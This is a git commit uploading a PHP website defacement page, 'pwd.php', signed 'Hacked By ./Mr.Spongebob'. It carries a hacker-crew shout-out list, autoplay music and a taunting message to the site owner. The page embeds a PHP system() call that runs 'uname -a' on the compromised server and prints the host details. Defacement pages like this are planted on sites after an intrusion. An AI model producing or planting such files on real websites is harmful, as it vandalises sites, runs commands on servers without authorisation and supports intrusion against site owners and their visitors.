504e6acc728adbbe38bb35bf4c257283a2810f44
adit ganteng <kangpepes@protonmail.com>
2025-02-09 16:02:48 +0700

    Add files via upload

---
+++ pwd.php
@@ -0,0 +1,36 @@
+<head>
+<title>Hacked By ./Mr.Spongebob</title>
+<meta charset="UTF-8">
+<meta name="description" content="AnonSec Team">
+<link rel="icon" href="https://i.imgur.com/STpfZR9.png">
+<link href="https://fonts.googleapis.com/css?family=Iceberg:400,700" rel="stylesheet" type="text/css">
+<meta name="keywords" content="./Mr.Spongebob,Sukabumi BlackHat,spongebob,mr.spongebob,Hacked by ./Mr.Spongebob,hacked by">
+<meta name="author" content="./Mr.Spongebob">
+<meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
+<style>
+@keyframes kedipz {0%{opacity:0}10%{opacity:1}20%{opacity:0}30%{opacity:1}40%{opacity:0}50%{opacity:1}60%{opacity:0}70%{opacity:1}80%{opacity:0}90%{opacity:1}95%{opacity:0}100%{opacity:1}}a {color:#27f6a4;text-decoration:none;}a:hover, a:active {opacity:1;animation-name:kedipz;animation-duration:0.5s}.barlink {margin-bottom:10px;}.justified {margin-top:15px;margin-bottom:20px;border-top:3px #27f6a4 solid;border-bottom:3px #27f6a4 solid;padding:5px;padding-top:10px;padding-bottom:10px;text-align: justify;-moz-text-align-last: center;text-align-last: center;width:80%;}.containerx {width: 60%;text-align: center;margin-top:15px;margin-bottom:20px;border-top:3px #27f6a4 solid;border-bottom:3px #27f6a4 solid;padding:10px;padding-top:10px;padding-bottom:10px;}.contentx {text-align: justify;}h2 {margin:0;}@media screen and (max-width: 500px) {.containerx {width: 80%;}}
+body{background-color:black;font-family: 'Share Tech Mono', monospace;}
+<link href="https://fonts.googleapis.com/css?family=Share+Tech+Mono" rel="stylesheet">
+</style>
+<body>
+	<iframe src="" type="audio/mp3" allow="autoplay" id="audio" style="display:none"></iframe>
+<audio autoplay>
+<source src="https://j.top4top.io/m_1474951pu6.mp3" type="audio/mp3">
+</audio>
+<center>
+<br>
+<font size="2" family="Share Tech Mono" color="grey"><?php system("uname -a");?><br>
+<img src="https://i.ibb.co.com/TBmRVS8/wallpaperflare-com-wallpaper-copy-1.jpg" width="480" heigth="350" />
+<br>
+<br>
+<h2><font color="red">Hacked By ./Mr.Spongebob</font></h2><br>
+<font size="2" family="Share Tech Mono" color="grey">Security? It's Just An illusion,Pleas Patch It Before Got Hacked Again!<br><br>kangpepes@protonmail.com<br>
+<br>
+<font color="lime">| Anon7 | Type-0 | ./meicookies | MR.HAGAN_404CR4ZY | He4l3rz | Mr.Grim | VenoRyan | Rian Haxor | ChokkaXploiter | MungielL | Nzxsx7 |<br> ./G1L4N6_ST86 | kuroaMEpiKAcyu | UnknownSec | Temp3 | xRyukz  | RavaFake | Cubjrnet7 | Calutax07 | ./Mr.Spongebob | ./BE64L | DemonArmy | ./Outsiders | Sukabumi BlackHat </font>
+<br>
+<br>
+<br><center></script>
+<br>
+<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+</center>
+</html>
